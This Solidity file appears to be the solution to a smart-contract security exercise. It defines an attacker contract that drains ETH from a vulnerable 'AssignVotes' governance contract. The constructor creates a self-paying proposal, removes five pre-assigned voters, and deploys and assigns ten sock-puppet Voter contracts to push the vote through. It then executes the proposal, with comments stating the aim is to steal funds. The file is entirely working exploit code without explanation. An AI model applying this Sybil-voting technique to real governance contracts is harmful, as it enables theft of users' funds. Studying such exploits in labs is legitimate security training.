// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../AssignVotes.sol";

contract AssignVotesAttacker {
    constructor(address _victim) payable {
        AssignVotes victim = AssignVotes(_victim);
        // create Proposal to steal eth
        victim.createProposal(address(this), "", 1 ether);
        // remove all assigned address and gain the extra 5 to amountAssigned
        address[5] memory toRemove = [
            0x976EA74026E726554dB657fA54763abd0C3a0aa9,
            0x14dC79964da2C08b23698B3D3cc7Ca32193d9955,
            0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f,
            0xa0Ee7A142d267C1f36714E4a8F75612F20a79720,
            0xBcd4042DE499D14e55001CcbB24a551F3b954096
        ];
        for (uint i = 0; i < 5; i++) {
            victim.removeAssignment(toRemove[i]);
        }
        // deploy new voter , assign it and make it vote
        for (uint i = 0; i < 10; i++) {
            Voter voter = new Voter(victim);
            victim.assign(address(voter));
            voter.vote();
        }
        // execute vote and steal funds
        victim.execute(0);
    }
}

// dummy voter contract
contract Voter {
    AssignVotes public victim;

    constructor(AssignVotes _victim) {
        victim = _victim;
    }
    function vote() public {
        victim.vote(0);
    }
}
